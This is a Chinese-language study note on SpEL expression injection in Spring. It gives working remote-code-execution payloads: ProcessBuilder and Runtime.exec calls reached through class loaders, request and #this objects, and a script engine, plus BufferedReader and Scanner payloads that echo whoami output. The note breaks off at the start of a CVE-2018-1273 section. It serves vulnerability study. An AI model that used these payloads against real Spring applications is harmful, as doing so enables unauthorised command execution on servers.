SpEL

玩转SpEL表达式
漏洞的成因就在于SpEL表达式能够调用静态类的静态方法或其它类的成员方法
来看一个简单的调用例子

public class SpEL_Test {  
  
    public static  void main(String args[]){  
        Say_Hello sayHello = new Say_Hello();  
        ExpressionParser parser = new SpelExpressionParser();  
        StandardEvaluationContext context = new StandardEvaluationContext(sayHello);  
        context.setVariable("say",sayHello);  
        String result = (String) parser.parseExpression("#say.Say('uu2fu3o')").getValue(context);  
    }  
  
}

或者可以使用type关键字进行代替，使用type需要用完整的路径

ExpressionParser parser = new SpelExpressionParser();  
parser.parseExpression("T(org.example.spring.SpEL_Test.Say_Hello).SayBye('uu2fu3o')").getValue();

还有一点需要注意的是T()用于调用静态方法以及常量，调用动态方法时会抛出错误

spel表达式中支持调用类的构造器，因此可以有以下操作

String cmdStr = "new java.lang.ProcessBuilder(\"calc\").start()";  
ExpressionParser parser = new SpelExpressionParser();  
String result = (String) parser.parseExpression(cmdStr).getValue();

通过创建ProcessBuilder进程弹计算器，在此基础上进行rce

AppClassLoader

AppClassLoader 直接面向用户,它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录

由于双亲委派的存在,它可以加载到我们想要的类
使用的前提是获取 , 获取AppClassLoader可以通过ClassLoader类的静态方法getSystemClassLoader

ClassLoader.getSystemClassLoader()
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("calc")

可以通过其他类获取AppClassLoader
项目中有spel依赖，则org.springframework包下类的classloader为app

T(org.springframework.expression.Expression).getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec('calc')

这里无法执行，似乎没有正确的loadClass

通过内置对象加载UrlClassLoader

可以通过web项目自带的request.response对象来获取
0c0c0f

#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch/tmp/foobar\")}

username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('xterm')")]=asdf

两条poc分别通过#request ,#this来获取UrlClassLoader

回显

通用方法

JDK原生回显类BufferedReader

new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder( "whoami").start().getInputStream(), "gbk")).readLine()

Scanner回显

new java.util.Scanner(new java.lang.ProcessBuilder("whoami").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()`

该方法的原理是Scanner#UseDelimiter使用指定的字符串分割输出，紊乱的字符串会使所有输出出现在第一行，然后.next()获取所有输出即可

CVE-2018-1273 Spring-Data-Commons

影响版本
简单来说Spring-Data-Commons有很多子模块支持多种资源存储方式，独立使用的扩展
在项目中添加该包扩展

<dependency>  
    <groupId>org.springframework.data</groupId>  
    <artifactId>spring-data-commons</artifactId>  
    <version>1.13.10.RELEASE</version>  
</dependency>

该漏洞的成因在于所传递的controller参数被ProxyingHandlerMethodArgumentResolve解析
